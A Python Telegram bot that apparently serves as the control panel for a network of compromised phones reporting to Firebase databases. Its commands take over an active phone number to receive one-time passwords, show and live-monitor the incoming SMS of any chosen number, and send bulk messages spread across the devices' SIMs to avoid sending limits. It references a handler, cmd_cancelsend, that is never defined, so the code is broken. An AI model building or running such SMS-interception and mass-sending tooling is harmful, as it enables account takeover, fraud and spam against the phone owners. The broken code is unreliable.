import os
import re
import time
import asyncio
import aiohttp
import logging
import random
from datetime import datetime, timezone, timedelta
from aiohttp import web

from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application,
    CommandHandler,
    CallbackQueryHandler,
    MessageHandler,
    filters,
    ContextTypes,
    ConversationHandler,
)

# --- Configuration & Environment Variables ---
BOT_TOKEN = os.environ.get("BOT_TOKEN", "YOUR_BOT_TOKEN")
ADMIN_CHAT_ID = int(os.environ.get("ADMIN_CHAT_ID", 0))

# Parse allowed users (comma-separated)
ACCESS_USERS_STR = os.environ.get("ACCESS_USERS", "")
ACCESS_USERS = [int(x.strip()) for x in ACCESS_USERS_STR.split(",") if x.strip().lstrip('-').isdigit()]
if ADMIN_CHAT_ID != 0 and ADMIN_CHAT_ID not in ACCESS_USERS:
    ACCESS_USERS.append(ADMIN_CHAT_ID)

# Parse Firebase URLs (comma-separated)
FB_URLS_STR = os.environ.get("FIREBASE_URLS", "")
FIREBASE_URLS = [url.strip().rstrip('/') for url in FB_URLS_STR.split(",") if url.strip()]

logging.basicConfig(format="%(asctime)s - %(name)s - %(levelname)s - %(message)s", level=logging.WARNING)

# Conversation States
ASK_TARGET_NUMBER = 1
ASK_MESSAGE_TEXT = 2
ASK_QUANTITY = 3
ASK_SPECIFIC_NUMBER = 4
ADMIN_WAIT_PAYLOAD = 5

# Global Trackers
BLOCKED_USERS = set()
active_otp_sessions = {}   # user_id: {"stop": False, "task": asyncio.Task}
active_send_tasks = {}     # user_id: {"stop": False}
global_seen_messages = set() # To strictly prevent duplicate OTP alerts

# --- AIOHTTP Web Server for Render & UptimeRobot ---
async def health_check(request):
    return web.Response(text="Bot is running and healthy!")

async def start_web_server():
    app = web.Application()
    app.router.add_get('/', health_check)
    runner = web.AppRunner(app)
    await runner.setup()
    port = int(os.environ.get("PORT", 8080))
    site = web.TCPSite(runner, '0.0.0.0', port)
    await site.start()
    print(f"Web server started on port {port} for UptimeRobot.")

# --- Firebase Helpers ---
async def fetch_json(url):
    async with aiohttp.ClientSession() as session:
        try:
            async with session.get(f"{url}.json", timeout=10) as response:
                if response.status == 200:
                    return await response.json()
        except Exception: pass
    return None

async def put_json(url, payload):
    async with aiohttp.ClientSession() as session:
        try:
            async with session.put(f"{url}.json", json=payload, timeout=5) as response:
                return response.status == 200
        except Exception: pass
    return False

async def post_json(url, payload):
    """POST to Firebase to create a unique ID under a node."""
    async with aiohttp.ClientSession() as session:
        try:
            async with session.post(f"{url}.json", json=payload, timeout=5) as response:
                return response.status == 200
        except Exception: pass
    return False

async def log_action_to_firebase(user_id, user_name, action, details=""):
    """Logs every bot action to the /mobile/logs node in the primary database."""
    if not FIREBASE_URLS: return
    primary_db = FIREBASE_URLS[0]
    ist_tz = timezone(timedelta(hours=5, minutes=30))
    payload = {
        "timestamp": int(time.time() * 1000),
        "date_time": datetime.now(ist_tz).strftime('%Y-%m-%d %H:%M:%S'),
        "user_id": user_id,
        "user_name": user_name,
        "action": action,
        "details": details
    }
    await post_json(f"{primary_db}/mobile/logs", payload)

def clean_mobile_number(raw_num):
    if not raw_num: return None
    num = str(raw_num).replace(' ', '').replace('+', '').replace('-', '')
    if len(num) == 12 and num.startswith('91'):
        num = num[2:]
    if len(num) == 10 and re.match(r'^[6-9]\d{9}$', num):
        return num
    return None

def get_latest_timestamp(client_data):
    timestamps = [0]
    if isinstance(client_data, dict):
        ping_ts = client_data.get('ping', {}).get('ts', 0)
        hb_ts = client_data.get('heartbeat', {}).get('timestamp', 0)
        if str(ping_ts).isdigit(): timestamps.append(int(ping_ts))
        if str(hb_ts).isdigit(): timestamps.append(int(hb_ts))
    return max(timestamps)

def is_authorized(user_id):
    return user_id in ACCESS_USERS and user_id not in BLOCKED_USERS

async def notify_admin(context, message):
    if ADMIN_CHAT_ID:
        try:
            await context.bot.send_message(chat_id=ADMIN_CHAT_ID, text=f"🛡️ [ADMIN]\n{message}")
        except Exception: pass

def get_cancel_keyboard():
    return InlineKeyboardMarkup([[InlineKeyboardButton("Cancel ❌", callback_data="cancel_action")]])

def get_main_menu():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("Get OTP 📩", callback_data="get_otp")],
        [InlineKeyboardButton("Get Msg on Specific No. 🎯", callback_data="get_specific_no")],
        [InlineKeyboardButton("Send Message 📤", callback_data="send_message")]
    ])

# --- General Handlers ---
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    if not is_authorized(user.id): return
    welcome_text = (
        f"Welcome, {user.first_name}! 👋\n\n"
        "I am your highly advanced, cross-database Firebase SMS Controller.\n"
        "Choose an action below:"
    )
    await update.message.reply_text(welcome_text, reply_markup=get_main_menu())
    await log_action_to_firebase(user.id, user.first_name, "STARTED_BOT")

async def cancel_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    await query.edit_message_text("Action Cancelled 🛑", reply_markup=get_main_menu())
    return ConversationHandler.END

async def cancel_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("Action Cancelled 🛑", reply_markup=get_main_menu())
    return ConversationHandler.END

# --- Admin Commands ---
async def cmd_block(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_CHAT_ID: return
    try:
        target_id = int(context.args[0])
        BLOCKED_USERS.add(target_id)
        if target_id in active_otp_sessions:
            active_otp_sessions[target_id]["stop"] = True
            if active_otp_sessions[target_id].get("task"): active_otp_sessions[target_id]["task"].cancel()
        if target_id in active_send_tasks:
            active_send_tasks[target_id]["stop"] = True
        await update.message.reply_text(f"✅ User {target_id} blocked and tasks stopped.")
    except (IndexError, ValueError):
        await update.message.reply_text("Usage: /block <chat_id>")

async def cmd_release(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_CHAT_ID: return
    try:
        target_id = int(context.args[0])
        BLOCKED_USERS.discard(target_id)
        await update.message.reply_text(f"✅ User {target_id} unblocked.")
    except (IndexError, ValueError):
        await update.message.reply_text("Usage: /release <chat_id>")

async def cmd_admin_send(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_CHAT_ID: return
    try:
        target_id = int(context.args[0])
        context.user_data['admin_target_chat'] = target_id
        await update.message.reply_text(f"Send the message, photo, or video you want to forward to {target_id}:", reply_markup=get_cancel_keyboard())
        return ADMIN_WAIT_PAYLOAD
    except (IndexError, ValueError):
        await update.message.reply_text("Usage: /send <chat_id>")
        return ConversationHandler.END

async def admin_forward_payload(update: Update, context: ContextTypes.DEFAULT_TYPE):
    target_id = context.user_data.get('admin_target_chat')
    try:
        await update.message.copy(chat_id=target_id)
        await update.message.reply_text(f"✅ Successfully sent to {target_id}.")
    except Exception as e:
        await update.message.reply_text(f"❌ Failed to send: {e}")
    return ConversationHandler.END

# --- Core OTP Workflow ---
async def handle_get_otp(update: Update, context: ContextTypes.DEFAULT_TYPE, is_new=False):
    query = update.callback_query
    user = query.from_user
    
    if user.id in active_otp_sessions:
        active_otp_sessions[user.id]["stop"] = True
        if active_otp_sessions[user.id].get("task"): active_otp_sessions[user.id]["task"].cancel()

    await query.edit_message_text("Searching databases for an active number... ⏳")
    
    fetch_tasks = [fetch_json(f"{fb_url}/clients") for fb_url in FIREBASE_URLS]
    results = await asyncio.gather(*fetch_tasks)
    
    ist_tz = timezone(timedelta(hours=5, minutes=30))
    now = datetime.now(ist_tz)
    
    all_active_devices = []
    time_window_mins = 10
    
    # Check 10, then 20, up to 1440 mins if nothing found
    while time_window_mins <= 1440:
        cutoff_ms = int((now - timedelta(minutes=time_window_mins)).timestamp() * 1000)
        
        for fb_url, clients_data in zip(FIREBASE_URLS, results):
            if not clients_data: continue
            for dev_id, client in clients_data.items():
                if get_latest_timestamp(client) >= cutoff_ms:
                    raw_num = client.get('mobNo')
                    if not raw_num and isinstance(client.get('sims'), list) and len(client.get('sims')) > 0:
                        raw_num = client['sims'][0].get('phoneNumber')
                    valid_num = clean_mobile_number(raw_num)
                    if valid_num:
                        all_active_devices.append({'fb_url': fb_url, 'dev_id': dev_id, 'num': valid_num})
        
        if all_active_devices: break
        time_window_mins += 10

    if not all_active_devices:
        await query.edit_message_text("❌ No active numbers found.", reply_markup=get_main_menu())
        return

    previously_used = context.user_data.get('used_numbers', set())
    selected = None
    
    if is_new:
        for device in all_active_devices:
            if device['num'] not in previously_used:
                selected = device
                break
        if not selected:
            previously_used.clear()
            selected = random.choice(all_active_devices)
    else:
        selected = all_active_devices[0]

    context.user_data.setdefault('used_numbers', set()).add(selected['num'])
    
    await log_action_to_firebase(user.id, user.first_name, "REQUESTED_OTP", f"Allocated Number: {selected['num']}")
    await notify_admin(context, f"User {user.first_name} Requested OTP on: {selected['num']}")
    
    kb = [
        [InlineKeyboardButton("Get New Number 🔄", callback_data="get_new_number")],
        [InlineKeyboardButton("Cancel Number ❌", callback_data="cancel_number")]
    ]
    await query.edit_message_text(
        f"✅ **Number Found:** `{selected['num']}`\n"
        f"Status: **Valid for 5 Minutes** ⏱️\n"
        f"Send your SMS. New messages will appear here.",
        reply_markup=InlineKeyboardMarkup(kb), parse_mode="Markdown"
    )

    active_otp_sessions[user.id] = {"stop": False}
    task = asyncio.create_task(monitor_otp(context, user.id, query.message.chat_id, selected['fb_url'], selected['dev_id'], selected['num'], 300))
    active_otp_sessions[user.id]["task"] = task

async def monitor_otp(context, user_id, chat_id, fb_url, dev_id, mobile_number, duration_secs):
    end_time = time.time() + duration_secs
    
    # Pre-populate to avoid fetching historical messages
    initial_msgs = await fetch_json(f"{fb_url}/messages/{dev_id}")
    if initial_msgs:
        for k, m in initial_msgs.items():
            if isinstance(m, dict):
                global_seen_messages.add(f"{dev_id}_{m.get('id', k)}")

    while time.time() < end_time:
        if active_otp_sessions.get(user_id, {}).get("stop", True): return
        
        fresh_msgs = await fetch_json(f"{fb_url}/messages/{dev_id}")
        if fresh_msgs:
            for k, m in fresh_msgs.items():
                if not isinstance(m, dict): continue
                
                # STRICT FIX: Only process 'incoming' messages to avoid custom message cross-talk
                if m.get('type') != 'incoming': 
                    continue
                    
                msg_id = str(m.get('id', k))
                unique_key = f"{dev_id}_{msg_id}"
                
                if unique_key not in global_seen_messages and msg_id != '':
                    global_seen_messages.add(unique_key)
                    
                    sender = m.get('sender', 'Unknown')
                    text = m.get('message', '')
                    dt = m.get('dateTime', 'Just Now')
                    alert = f"🔔 **NEW MESSAGE** 🔔\n\n**To:** `{mobile_number}`\n**From:** {sender}\n**Time:** {dt}\n\n**Message:**\n`{text}`"
                    
                    try:
                        await context.bot.send_message(chat_id=chat_id, text=alert, parse_mode="Markdown")
                        await notify_admin(context, f"User {user_id} Received SMS on {mobile_number}:\n{alert}")
                        await log_action_to_firebase(user_id, "User", "RECEIVED_SMS", f"To: {mobile_number} | From: {sender} | Msg: {text}")
                    except Exception: pass
        await asyncio.sleep(2)
        
    if not active_otp_sessions.get(user_id, {}).get("stop", False):
        try:
            await context.bot.send_message(chat_id=chat_id, text=f"⏰ The 5-minute window for `{mobile_number}` has expired.", reply_markup=get_main_menu())
        except Exception: pass
        active_otp_sessions[user_id]["stop"] = True

# --- Get Message on Specific Number Flow ---
async def start_specific_no(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    if not is_authorized(query.from_user.id): return ConversationHandler.END
    await query.answer()
    await query.edit_message_text("Enter the 10-digit mobile number to monitor:", reply_markup=get_cancel_keyboard())
    return ASK_SPECIFIC_NUMBER

async def fetch_specific_number(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    raw_num = update.message.text.strip()
    target_num = clean_mobile_number(raw_num)
    
    if not target_num:
        await update.message.reply_text("❌ Invalid format. Please enter a valid 10-digit number.", reply_markup=get_cancel_keyboard())
        return ASK_SPECIFIC_NUMBER

    status_msg = await update.message.reply_text("Searching databases for this number (last 60 mins)... ⏳")
    
    fetch_tasks = [fetch_json(f"{fb_url}/clients") for fb_url in FIREBASE_URLS]
    results = await asyncio.gather(*fetch_tasks)
    
    cutoff_ms = int((datetime.now(timezone.utc) - timedelta(minutes=60)).timestamp() * 1000)
    found_device = None
    
    for fb_url, clients_data in zip(FIREBASE_URLS, results):
        if not clients_data: continue
        for dev_id, client in clients_data.items():
            if get_latest_timestamp(client) >= cutoff_ms:
                c_num = clean_mobile_number(client.get('mobNo'))
                if not c_num and isinstance(client.get('sims'), list) and len(client.get('sims')) > 0:
                    c_num = clean_mobile_number(client['sims'][0].get('phoneNumber'))
                if c_num == target_num:
                    found_device = (fb_url, dev_id)
                    break
        if found_device: break

    if not found_device:
        await status_msg.edit_text(f"❌ Number `{target_num}` not found or inactive in the last 60 mins.", parse_mode="Markdown", reply_markup=get_main_menu())
        return ConversationHandler.END

    fb_url, dev_id = found_device
    await notify_admin(context, f"User {user.first_name} requested specific tracking for {target_num}")
    await log_action_to_firebase(user.id, user.first_name, "TRACKED_SPECIFIC_NUMBER", f"Number: {target_num}")
    
    # Fetch last 10 messages (Incoming only)
    device_msgs = await fetch_json(f"{fb_url}/messages/{dev_id}") or {}
    incoming_msgs = [m for m in device_msgs.values() if isinstance(m, dict) and m.get('type') == 'incoming']
    sorted_msgs = sorted(incoming_msgs, key=lambda x: int(x.get('id', 0)) if str(x.get('id', '')).isdigit() else 0)
    last_10 = sorted_msgs[-10:] if len(sorted_msgs) >= 10 else sorted_msgs
    
    msg_history = f"✅ **Found Number:** `{target_num}`\n\n**--- Last {len(last_10)} Incoming Messages ---**\n"
    for m in last_10:
        msg_history += f"[{m.get('dateTime', '')}] {m.get('sender', '')}: {m.get('message', '')}\n\n"
    msg_history += "📡 **Starting Real-Time Listening (5 Mins)...**"
    
    kb = [[InlineKeyboardButton("Cancel Listening ❌", callback_data="cancel_number")]]
    await status_msg.edit_text(msg_history, parse_mode="Markdown", reply_markup=InlineKeyboardMarkup(kb))
    
    if user.id in active_otp_sessions and active_otp_sessions[user.id].get("task"):
        active_otp_sessions[user.id]["task"].cancel()
        
    active_otp_sessions[user.id] = {"stop": False}
    task = asyncio.create_task(monitor_otp(context, user.id, update.message.chat_id, fb_url, dev_id, target_num, 300))
    active_otp_sessions[user.id]["task"] = task
    
    return ConversationHandler.END

# --- Send Message Workflow ---
async def start_send_msg(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    if not is_authorized(query.from_user.id): return ConversationHandler.END
    await query.answer()
    await query.edit_message_text("Enter the **Target Mobile Number**:", parse_mode="Markdown", reply_markup=get_cancel_keyboard())
    return ASK_TARGET_NUMBER

async def ask_msg_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
    context.user_data['target_number'] = update.message.text.strip()
    await update.message.reply_text("Enter the **Custom Message** you want to send:", parse_mode="Markdown", reply_markup=get_cancel_keyboard())
    return ASK_MESSAGE_TEXT

async def ask_quantity(update: Update, context: ContextTypes.DEFAULT_TYPE):
    context.user_data['custom_message'] = update.message.text.strip()
    await update.message.reply_text("Enter the **Total Quantity** of messages to send (e.g., 10):", parse_mode="Markdown", reply_markup=get_cancel_keyboard())
    return ASK_QUANTITY

async def process_sending(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    try:
        quantity = int(update.message.text.strip())
    except ValueError:
        await update.message.reply_text("Invalid quantity. Aborting.", reply_markup=get_main_menu())
        return ConversationHandler.END

    target_number = context.user_data.get('target_number')
    msg_text = context.user_data.get('custom_message')
    
    kb = [[InlineKeyboardButton("Stop Sending 🛑", callback_data="stop_sending")]]
    status_msg = await update.message.reply_text("Initializing message batch... 🚀", reply_markup=InlineKeyboardMarkup(kb))
    
    active_send_tasks[user.id] = {"stop": False}
    asyncio.create_task(run_batch_send(context, user, target_number, msg_text, quantity, status_msg))
    
    return ConversationHandler.END

async def run_batch_send(context, user, target_number, msg_text, quantity, status_msg):
    await notify_admin(context, f"User {user.first_name} sending {quantity} msgs to {target_number}.\n\nPayload:\n`{msg_text}`")
    await log_action_to_firebase(user.id, user.first_name, "BATCH_SEND_STARTED", f"Target: {target_number} | Qty: {quantity} | Msg: {msg_text}")

    cutoff_ms = int((datetime.now(timezone.utc) - timedelta(minutes=10)).timestamp() * 1000)
    fetch_tasks = [fetch_json(f"{fb_url}/clients") for fb_url in FIREBASE_URLS]
    results = await asyncio.gather(*fetch_tasks)
    
    active_devices = []
    for fb_url, clients_data in zip(FIREBASE_URLS, results):
        if not clients_data: continue
        for dev_id, client in clients_data.items():
            if get_latest_timestamp(client) >= cutoff_ms:
                active_devices.append((fb_url, dev_id))

    if not active_devices:
        await status_msg.edit_text("❌ No active devices found to process request.", reply_markup=get_main_menu())
        return

    # To avoid the 100 SMS limit per SIM, shuffle devices to spread the load randomly
    random.shuffle(active_devices)

    success, failed = 0, 0
    kb = [[InlineKeyboardButton("Stop Sending 🛑", callback_data="stop_sending")]]

    for i in range(1, quantity + 1):
        if active_send_tasks.get(user.id, {}).get("stop", False):
            break
            
        fb_url, dev_id = active_devices[i % len(active_devices)]
        payload = {
            "to": target_number,
            "message": msg_text,
            "isSended": False,
            "from": 1,
            "_wake": True,
            "type": "outgoing",  # Ensure it doesn't trigger OTP listeners
            "_nonce": f"wake_{int(time.time() * 1000)}"
        }
        
        webhook_url = f"{fb_url}/clients/{dev_id}/webhookEvent/sendSms"
        await put_json(webhook_url, payload)
        success += 1 # Auto mark success 

        if i % 3 == 0 or i == quantity:
            filled = int(15 * i / quantity)
            bar = f"[{'█' * filled}{'░' * (15 - filled)}]"
            try:
                await status_msg.edit_text(
                    f"**Sending Messages...** 🚀\n{bar} {i}/{quantity}\nSuccess: {success} | Failed: {failed}",
                    parse_mode="Markdown", reply_markup=InlineKeyboardMarkup(kb)
                )
            except Exception: pass
        await asyncio.sleep(0.5)

    final_report = (
        f"✅ **Batch Send Finished** ✅\n\n"
        f"Target: `{target_number}`\nTotal Processed: {success + failed}/{quantity}\n"
        f"Successful: {success}\nFailed: {failed}"
    )
    await status_msg.edit_text(final_report, parse_mode="Markdown", reply_markup=get_main_menu())
    await notify_admin(context, f"Batch complete for {user.first_name}:\n{final_report}")
    await log_action_to_firebase(user.id, user.first_name, "BATCH_SEND_COMPLETED", f"Target: {target_number} | Success: {success} | Failed: {failed}")

# --- General Callback Handler ---
async def callback_router(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    user = query.from_user
    if not is_authorized(user.id): return
    await query.answer()
    
    data = query.data
    if data == "get_otp":
        await handle_get_otp(update, context)
    elif data == "get_new_number":
        await handle_get_otp(update, context, is_new=True)
    elif data == "cancel_number":
        if user.id in active_otp_sessions:
            active_otp_sessions[user.id]["stop"] = True
            if active_otp_sessions[user.id].get("task"): active_otp_sessions[user.id]["task"].cancel()
            await query.edit_message_text("🛑 OTP monitoring cancelled.", reply_markup=get_main_menu())
    elif data == "stop_sending":
        if user.id in active_send_tasks:
            active_send_tasks[user.id]["stop"] = True
            await query.edit_message_text("🛑 Stopping message batch... please wait.", parse_mode="Markdown")

# --- Application Startup Hook ---
async def post_init(application: Application):
    asyncio.create_task(start_web_server())

# --- Main App Execution ---
def main():
    if not BOT_TOKEN or BOT_TOKEN == "YOUR_BOT_TOKEN":
        print("Error: BOT_TOKEN is missing.")
        return

    app = Application.builder().token(BOT_TOKEN).post_init(post_init).build()

    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("block", cmd_block))
    app.add_handler(CommandHandler("release", cmd_release))
    app.add_handler(CommandHandler("cancelsend", cmd_cancelsend))

    # Send Message Conversation
    send_conv = ConversationHandler(
        entry_points=[CallbackQueryHandler(start_send_msg, pattern="^send_message$")],
        states={
            ASK_TARGET_NUMBER: [MessageHandler(filters.TEXT & ~filters.COMMAND, ask_msg_text)],
            ASK_MESSAGE_TEXT: [MessageHandler(filters.TEXT & ~filters.COMMAND, ask_quantity)],
            ASK_QUANTITY: [MessageHandler(filters.TEXT & ~filters.COMMAND, process_sending)],
        },
        fallbacks=[
            CommandHandler('cancel', cancel_command),
            CallbackQueryHandler(cancel_handler, pattern="^cancel_action$")
        ]
    )
    app.add_handler(send_conv)

    # Specific Number Conversation
    specific_no_conv = ConversationHandler(
        entry_points=[CallbackQueryHandler(start_specific_no, pattern="^get_specific_no$")],
        states={
            ASK_SPECIFIC_NUMBER: [MessageHandler(filters.TEXT & ~filters.COMMAND, fetch_specific_number)],
        },
        fallbacks=[
            CommandHandler('cancel', cancel_command),
            CallbackQueryHandler(cancel_handler, pattern="^cancel_action$")
        ]
    )
    app.add_handler(specific_no_conv)
    
    # Admin Send Conversation
    admin_send_conv = ConversationHandler(
        entry_points=[CommandHandler('send', cmd_admin_send)],
        states={
            ADMIN_WAIT_PAYLOAD: [MessageHandler(filters.ALL & ~filters.COMMAND, admin_forward_payload)],
        },
        fallbacks=[
            CommandHandler('cancel', cancel_command),
            CallbackQueryHandler(cancel_handler, pattern="^cancel_action$")
        ]
    )
    app.add_handler(admin_send_conv)

    app.add_handler(CallbackQueryHandler(callback_router))

    print("Starting bot and web server...")
    app.run_polling()

if __name__ == "__main__":
    main()
